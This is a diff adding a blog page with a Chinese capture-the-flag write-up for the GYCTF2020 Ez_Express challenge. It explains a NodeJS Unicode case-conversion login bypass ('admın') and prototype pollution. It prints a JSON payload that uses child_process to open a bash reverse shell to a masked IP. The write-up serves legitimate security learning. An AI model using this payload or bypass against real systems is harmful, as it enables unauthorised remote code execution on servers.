@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="知识点：  NodeJS 代码审计 NodeJS 大小写转换特性 NodeJS 原型链（Prototype）污染  打开靶机，有源码泄露 &#x2F;www.zip，下载源码。 打开源码包，主要审 routes 下路由的源码。 源码开头看到merge和clone，联想到原型链污染漏洞。一查还真是其他文章里的例子，就变了个变量名。注册这里会把用户名大写之后储存进 session。  要注册成 ADMIN 才能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU｜[GYCTF2020]Ez_Express">
+<meta property="og:url" content="http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="知识点：  NodeJS 代码审计 NodeJS 大小写转换特性 NodeJS 原型链（Prototype）污染  打开靶机，有源码泄露 &#x2F;www.zip，下载源码。 打开源码包，主要审 routes 下路由的源码。 源码开头看到merge和clone，联想到原型链污染漏洞。一查还真是其他文章里的例子，就变了个变量名。注册这里会把用户名大写之后储存进 session。  要注册成 ADMIN 才能">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010611.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010626.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010639.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010652.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010704.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010714.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010728.png">
+<meta property="article:published_time" content="2020-03-25T11:37:23.000Z">
+<meta property="article:modified_time" content="2021-02-16T17:07:33.859Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010611.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUU｜[GYCTF2020]Ez_Express</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/25/BUU%EF%BD%9C-SUCTF-2018-annonymous/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/24/BUU%EF%BD%9C-GYCTF2020-Node-Game/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&text=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&is_video=false&description=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜[GYCTF2020]Ez_Express&body=Check out this article: http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&name=BUU｜[GYCTF2020]Ez_Express&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&t=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUU｜[GYCTF2020]Ez_Express
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-25T11:37:23.000Z" itemprop="datePublished">2020-03-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>知识点：</p>
+<ul>
+<li>NodeJS 代码审计</li>
+<li>NodeJS 大小写转换特性</li>
+<li>NodeJS 原型链（Prototype）污染</li>
+</ul>
+<p>打开靶机，有源码泄露 /<a target="_blank" rel="noopener" href="http://www.zip,下载源码./">www.zip，下载源码。</a></p>
+<p>打开源码包，主要审 routes 下路由的源码。</p>
+<p>源码开头看到merge和clone，联想到原型链污染漏洞。一查还真是其他文章里的例子，就变了个变量名。<br>注册这里会把用户名大写之后储存进 session。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010611.png" alt="toupper"></p>
+<p>要注册成 ADMIN 才能触发 clone 进行原型链污染。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010626.png" alt="clone"></p>
+<p>但有限制，不让以 admin 注册。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010639.png" alt="admin"></p>
+<p>NodeJS大小写转换绕过<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-11">https://xz.aliyun.com/t/7184#toc-11</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010652.png" alt="nodejs"></p>
+<p>那么我们只需要把 <code>admin</code> 写成 <code>admın</code> 即可绕过上面的限制了。<br>注册，成功。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010704.png" alt="admin2"></p>
+<p>接下来就是原型链污染<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xx.xxx.xxx&#x2F;9999 0&gt;&amp;1\&quot;&#39;)&#x2F;&#x2F;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后提交/action（即最喜欢的语言）并抓包，然后填入poayload，注意要把Content-Type: 改为plication/json：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010714.png" alt="action"></p>
+<p>然后访问/info路由让outputFunctionName拼接到渲染引擎中触发原型链污染，即可得到shell：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217010728.png" alt="flag"></p>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a>   （深入理解 JavaScript Prototype 污染攻击）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-7">https://xz.aliyun.com/t/7184#toc-7</a><br><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6462.html">https://www.zhaoj.in/read-6462.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&text=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&is_video=false&description=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜[GYCTF2020]Ez_Express&body=Check out this article: http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&title=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&name=BUU｜[GYCTF2020]Ez_Express&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/25/BUU%EF%BD%9C-GYCTF2020-Ez-Express/&t=BUU｜[GYCTF2020]Ez_Express"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
